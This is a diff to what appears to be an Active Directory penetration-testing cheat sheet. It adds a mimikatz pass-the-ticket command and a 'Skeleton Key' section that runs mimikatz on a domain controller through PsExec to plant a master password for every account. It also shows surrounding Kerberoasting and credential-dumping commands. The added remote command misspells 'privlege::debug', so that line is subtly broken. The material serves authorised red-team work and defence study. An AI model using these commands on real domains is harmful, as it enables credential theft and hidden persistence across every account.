@@ -895,6 +895,14 @@ Import Module .\Invoke-Kerberoast.ps1
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hash.hash
 ```
 
+**Import Kerberos Tickets**
+
+(..so you can view them with klist)
+
+mimikatz.exe "privilege::debug" "kerberos:ptt c:\temp\tickets" "exit"
+
+
+
 **Cracking Service Ticket:**
 Since the service ticket is encrypted with the service accounts password hash, we can bruteforce this with a wordlist
 This is also possible with john the ripper or hashcat (which is a lot faster)
@@ -959,6 +967,19 @@ In case you do not have a proper shell try:
 ```
 .\mimikatz "sekurlsa::logonpasswords" exit
 ```
+
+## Skeleton Key
+By executing Mimikatz on the DC we can elevate privileges and gain persistence once you have established yourself in the domain.
+Through the skeleton key we inject into LSASS and create a master password that will work for any account in the domain. Existing passwords will also continue to work, so it is very difficult to know this attack has taken place.
+
+See also https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/skeleton-key
+
+Running mimikatz remotely on DC:
+```
+PsExec.exe \\myDC.local -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privlege::debug" "misc::skeleton" ^& "exit")
+```
+
+If everything worked every user account has now the master password 'mimikatz'. As mentioned the regular password is still valid.
 
 ## Golden Ticket Attack
 When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt. By getting the krbtgt password hash one is able to create custom TGTs (golden tickets)
